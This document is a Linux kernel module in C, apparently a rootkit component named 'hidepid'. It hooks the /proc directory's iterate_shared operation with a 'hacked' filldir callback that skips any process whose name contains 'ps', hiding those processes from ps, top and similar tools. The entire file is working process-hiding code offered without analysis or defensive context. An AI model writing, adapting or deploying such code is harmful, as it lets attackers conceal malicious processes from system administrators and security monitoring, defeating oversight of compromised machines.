#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/namei.h>

#define PROC_MASK "ps"
static struct file_operations *new_fops = NULL;
static const struct file_operations *orig_fops = NULL;
static struct inode *proc_inode;

filldir_t orig_filldir = NULL;

static bool hacked_filldir(struct dir_context *ctx, const char *name, int nlen, loff_t fpos, u64 ino, unsigned dtype)
{
	char process_name[TASK_COMM_LEN] = {0};
	struct task_struct *task;
	int filename = 0;

	// Convert filename to int, ignore any errors
	filename = simple_strtol(name, NULL, 10);

	rcu_read_lock(); // task_struct protection
	task = pid_task(find_vpid(filename), PIDTYPE_PID);
	if (task) {
		get_task_comm(process_name, task);
		// Check if process name contains PROC_MASK
		if (strstr(process_name, PROC_MASK)) {
			rcu_read_unlock();
			return true; // Skip this entry
		}
	}
	rcu_read_unlock();

	// Call original filldir function
	return orig_filldir(ctx, name, nlen, fpos, ino, dtype);
}

static int hacked_iterate(struct file *file, struct dir_context *ctx)
{
	// Replace actor function with hacked variant and call original iterate_shared()
	orig_filldir = ctx->actor;
	ctx->actor = hacked_filldir;

	return orig_fops->iterate_shared(file, ctx);
}

static int __init hidepid_init(void)
{
	struct path proc_path;
	struct file *proc_file;
	int ret;

	// Get inode for /proc directory
	ret = kern_path("/proc", LOOKUP_FOLLOW, &proc_path);
	if (ret) goto out;

	proc_file = dentry_open(&proc_path, O_RDONLY, current_cred());
	if (IS_ERR(proc_file)) {
		ret = PTR_ERR(proc_file);
		goto out_path;
	}

	proc_inode = proc_file->f_inode;

	// Create writable copy for file operations
	new_fops = kmemdup(proc_inode->i_fop, sizeof(*new_fops), GFP_KERNEL);
	if (!new_fops) {
		ret = -ENOMEM;
		goto out_cleanup;
	}

	// Replace fops and save original pointer
	orig_fops = proc_inode->i_fop;
	new_fops->iterate_shared = hacked_iterate;
	proc_inode->i_fop = new_fops;

	printk(KERN_INFO "hidepid: Loaded\n");

out_cleanup:
	filp_close(proc_file, NULL);
out_path:
	path_put(&proc_path);
out:
	if (ret)
		kfree(new_fops);

	return ret;
}

static void __exit hidepid_exit(void)
{
	// Restore original fops and free memory
	if (proc_inode)
		proc_inode->i_fop = orig_fops;

	if (new_fops)
		kfree(new_fops);

	printk(KERN_INFO "hidepid: Unloaded\n");
}

module_init(hidepid_init);
module_exit(hidepid_exit);
MODULE_LICENSE("GPL");
